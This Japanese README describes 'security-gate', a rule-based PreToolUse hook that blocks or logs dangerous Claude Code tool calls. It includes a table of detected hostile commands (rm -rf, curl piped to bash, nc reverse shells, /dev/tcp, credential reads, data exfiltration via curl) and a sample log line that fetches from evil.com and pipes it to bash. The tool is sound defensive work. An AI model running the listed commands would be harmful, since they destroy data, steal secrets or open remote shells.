# security-gate

## なぜ作ったか

Claude Code は AI エージェントとして自律的にシェルコマンドの実行・ファイルの編集・Web アクセスなどを行います。
外部コンテンツに埋め込まれた悪意ある指示（Prompt Injection）や、AI が誤って生成した危険なコマンド（`rm -rf /` など）が
そのまま実行されるリスクがあります。

このツールは Claude Code の `PreToolUse` フックとして動作し、**すべてのツール呼び出しの前にルールベースのチェックを行います**。
`allowedTools`（自動承認ツール）に登録された操作も含めて検査するため、
mattermost-gate などの承認フローをすり抜けた操作もブロックできます。

ルールは YAML ファイルで定義されており、エンジニア以外でも追加・変更が可能です。

## 主な機能

- **YAML ルール定義** — `rules.yaml` を編集するだけでルールを追加・無効化できる（ホットリロード）
- **3 種類の条件マッチング** — `regex`（正規表現）/ `contains`（部分文字列）/ `path_match`（glob パターン）
- **2 段階のアクション** — `block`（即座に拒否）/ `log`（通過するが JSONL に記録）
- **フェイルオープン設計** — YAML 構文エラーなどのフック自体の障害時は操作を通過させ、開発を止めない
- **JSONL 監査ログ** — block / log / pass の全イベントを `log/security.jsonl` に記録

## 防御対象カテゴリ（47 ルール）

| # | カテゴリ | 件数 | 主な検出内容 |
|---|---|---|---|
| 1 | ファイルシステム破壊 | 5 | `rm -rf` / `rmdir /s` / `dd if=/dev/zero` |
| 2 | リモートコード実行 | 4 | `curl \| bash` / `base64 \| bash` / `eval $(curl ...)` |
| 3 | 権限昇格 | 3 | `sudo bash` / `sudo -i` / `LD_PRELOAD=` |
| 4 | AI 固有攻撃（既存） | 5 | CLAUDE.md 改ざん / settings.json 改ざん / フックスクリプト上書き |
| 5 | Git 破壊操作 | 3 | `git push --force` / `git reset --hard` |
| 6 | 機密ファイル読み取り | 4 | SSH 秘密鍵 / AWS credentials / `.env` 外部送信 |
| 7 | システム停止 | 3 | `shutdown` / `reboot` / フォーク爆弾 |
| 8 | ネットワーク・リバースシェル | 3 | `nc -e bash` / `/dev/tcp` リダイレクト / `iptables -F` |
| 9 | パーシステンス（永続化） | 6 | `crontab -e` / systemd サービス / Windows Run レジストリ |
| 10 | サプライチェーン攻撃 | 3 | `pip --trusted-host` / 非公式 PyPI・npm レジストリ |
| 11 | データ外部送信 | 3 | `tar \| curl` / `history \| curl` / `find -exec curl` |
| 12 | コンテナ脱出 | 4 | `docker --privileged` / `-v /` マウント / `nsenter` |
| 13 | 難読化・バイパス | 4 | `eval $var` / `python -c "os.system(...)"` / `node -e "child_process"` |
| 14 | 暗号マイナー・偵察 | 2 | `xmrig` / `nmap`（ログのみ）|
| 15 | AI 固有攻撃（強化） | 3 | ゼロ幅文字インジェクション / MCP 設定改ざん / `.cursorrules` 書き込み |

## 動作フロー

```
Claude Code がツールを呼び出す（Bash / Edit / Write / Read / WebFetch ...）
    │
    ▼  PreToolUse フック（allowedTools に登録済みの操作も対象）
hook.py
    │  rules.yaml をロード
    ▼
RuleEngine.evaluate(tool_name, tool_input)
    │
    ├─ block ルールにマッチ ──→ stderr にブロック理由を出力 → sys.exit(2)
    │                          Claude Code はツール実行をキャンセル
    │
    ├─ log ルールにマッチ ───→ log/security.jsonl に記録 → sys.exit(0)
    │                          Claude Code はツール実行を続行
    │
    └─ マッチなし ──────────→ log/security.jsonl に pass 記録 → sys.exit(0)
                              Claude Code はツール実行を続行
                                    │
                                    ▼  PermissionRequest フック（mattermost-gate）
                              Mattermost で人間が承認・拒否
```

## セットアップ

### 1. 依存関係のインストール

`pyyaml` は既に `pyproject.toml` に含まれています。

```powershell
uv sync
```

### 2. Claude Code フック登録

`.claude/settings.json` に `PreToolUse` セクションを追加します。

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "C:\\claude\\.venv\\Scripts\\python.exe C:\\claude\\security-gate\\hook.py",
            "shell": "powershell"
          }
        ]
      }
    ]
  }
}
```

> 既存の `PermissionRequest`（mattermost-gate）フックとは独立したイベントなので、設定を壊さずに追加できます。

### 3. 動作確認

```powershell
# ブロック確認（exit code 2 が返り、stderr にブロック理由が出ること）
'{"tool_name":"Bash","tool_input":{"command":"rm -rf /"},"cwd":"C:\\claude","session_id":"test"}' |
    .venv\Scripts\python.exe security-gate\hook.py
echo "exit: $LASTEXITCODE"

# 通過確認（exit code 0 が返ること）
'{"tool_name":"Bash","tool_input":{"command":"ls -la"},"cwd":"C:\\claude","session_id":"test"}' |
    .venv\Scripts\python.exe security-gate\hook.py
echo "exit: $LASTEXITCODE"
```

## ルール定義ガイド

### YAML 構造

```yaml
version: 1

settings:
  log_path: "C:/claude/security-gate/log/security.jsonl"  # 省略可（デフォルトは同ディレクトリ内）

rules:
  - id: my_custom_rule          # ルール識別子（ログ・stderr に出力される）
    description: "説明文"        # 人間が読む説明
    enabled: true               # false にすると無効化（省略時は true）
    action: block               # block（拒否）または log（通過 + 記録）
    tools: [Bash, PowerShell]   # 対象ツール（省略時は全ツール）
    conditions:                 # OR ロジック（いずれか 1 つでも一致で発動）
      - type: regex
        field: command          # tool_input 内のフィールド名
        pattern: "危険なパターン"
```

### 条件タイプ

| type | field の指定先 | マッチ方法 |
|---|---|---|
| `regex` | `command`, `file_path`, `content`, `new_string` など | Python `re.search`（大文字小文字区別なし）|
| `contains` | 同上 | 部分文字列（大文字小文字区別なし）|
| `path_match` | `file_path` | fnmatch glob（`**` ワイルドカード対応）|

### ツール名とフィールドの対応

| ツール | 主なフィールド |
|---|---|
| `Bash`, `PowerShell` | `command` |
| `Write` | `file_path`, `content` |
| `Edit` | `file_path`, `old_string`, `new_string` |
| `Read`, `Glob` | `file_path` |
| `WebFetch` | `url` |

### conditions の OR ロジック

1 ルール内の conditions は **OR** で評価されます。
これにより、Bash の `command` フィールドと Read の `file_path` フィールドを
1 つのルールにまとめることができます。

```yaml
# 例: .env ファイルの読み取りを Bash / Read 両方で検出
- id: secret_read_env
  action: log
  tools: [Read, Bash]
  conditions:
    - type: path_match
      field: file_path           # Read ツールの場合
      paths: ["**/.env", "**/.env.*"]
    - type: regex
      field: command             # Bash ツールの場合
      pattern: "cat\\s+.*\\.env"
```

### ルールの追加例

```yaml
# 例: 本番 DB への危険な SQL をブロック
- id: db_drop_table
  description: "DROP TABLE / DROP DATABASE の実行"
  action: block
  tools: [Bash]
  conditions:
    - type: regex
      field: command
      pattern: "(?i)(DROP\\s+TABLE|DROP\\s+DATABASE|TRUNCATE\\s+TABLE)"

# 例: 特定ファイルへのアクセスをログ記録
- id: log_config_read
  description: "本番設定ファイルの読み取りを記録"
  action: log
  tools: [Read]
  conditions:
    - type: path_match
      field: file_path
      paths: ["**/production.yaml", "**/prod.json"]
```

## ディレクトリ構成

```
security-gate/
├── hook.py              # PreToolUse フックのエントリポイント
├── rule_engine.py       # ルール評価エンジン（RuleEngine / ConditionChecker / AuditLogger）
├── rules.yaml           # ルール定義（47 件）
├── tests/
│   ├── test_rule_engine.py  # 単体テスト（ConditionChecker / RuleEngine / AuditLogger）
│   └── test_hook.py         # 統合テスト（hook.py をサブプロセスで実行）
└── log/
    └── security.jsonl   # 監査ログ（.gitignore 済み）
```

## 監査ログ

`log/security.jsonl` に全イベントが JSONL 形式で記録されます。

```jsonc
// ブロック時
{"event": "block", "ts": "2026-05-28T10:00:00+00:00", "session_id": "abc123",
 "tool_name": "Bash", "rule_id": "rce_curl_pipe_bash",
 "description": "curl/wget をシェルにパイプして実行",
 "matched_field": "command", "matched_value": "curl http://evil.com | bash"}

// log アクション（通過 + 記録）
{"event": "log", "ts": "...", "session_id": "abc123",
 "tool_name": "Read", "rule_id": "secret_read_env",
 "matched_field": "file_path", "matched_value": "C:/project/.env"}

// マッチなし（通過）
{"event": "pass", "ts": "...", "session_id": "abc123",
 "tool_name": "Glob", "rule_id": null}
```

## テスト

```powershell
# 全テスト実行（124 件）
uv run pytest security-gate/tests/ -v

# カテゴリ別に実行
uv run pytest security-gate/tests/test_hook.py::TestPersistence -v
uv run pytest security-gate/tests/test_hook.py::TestSupplyChain -v
uv run pytest security-gate/tests/test_hook.py::TestAIAttackEnhanced -v

# 単体テストのみ
uv run pytest security-gate/tests/test_rule_engine.py -v
```

## トラブルシューティング

**ルールを追加したのに反映されない**  
`hook.py` は毎回 `rules.yaml` を読み直します（ホットリロード）。
Claude Code セッションの再起動は不要です。ただし YAML 構文エラーがあると空のルールリストで動作します。
`stderr` に `[security-gate] rules.yaml load error:` が出ていないか確認してください。

**正常なコマンドがブロックされる（誤検知）**  
該当ルールの `enabled: false` を設定して無効化できます。

```yaml
- id: fs_destroy_rm_rf
  enabled: false   # 一時的に無効化
  ...
```

または `action: log` に変更すると、ブロックせずに記録だけ行います。

**フックが動かない（exit code が返ってこない）**  
Python のパスを確認してください。

```powershell
Test-Path "C:\claude\.venv\Scripts\python.exe"
```

**`log/security.jsonl` が作成されない**  
ログディレクトリは初回書き込み時に自動作成されます。
書き込み失敗は `stderr` に `[security-gate] audit write error:` として出力されます。

## mattermost-gate との関係

| | security-gate | mattermost-gate |
|---|---|---|
| フックイベント | `PreToolUse` | `PermissionRequest` |
| 対象 | **全ツール呼び出し**（allowedTools 含む） | 未承認ツールのみ |
| 判断方式 | ルールベース（即時） | 人間が Mattermost で判断 |
| ブロック時 | 即座に拒否（通知なし） | Mattermost に通知 → 拒否 |
| 役割 | 明らかに危険な操作を自動ブロック | グレーゾーンを人間が判断 |

**実行順序**: security-gate（PreToolUse）→ mattermost-gate（PermissionRequest）  
security-gate でブロックされた操作は Mattermost に通知されません。
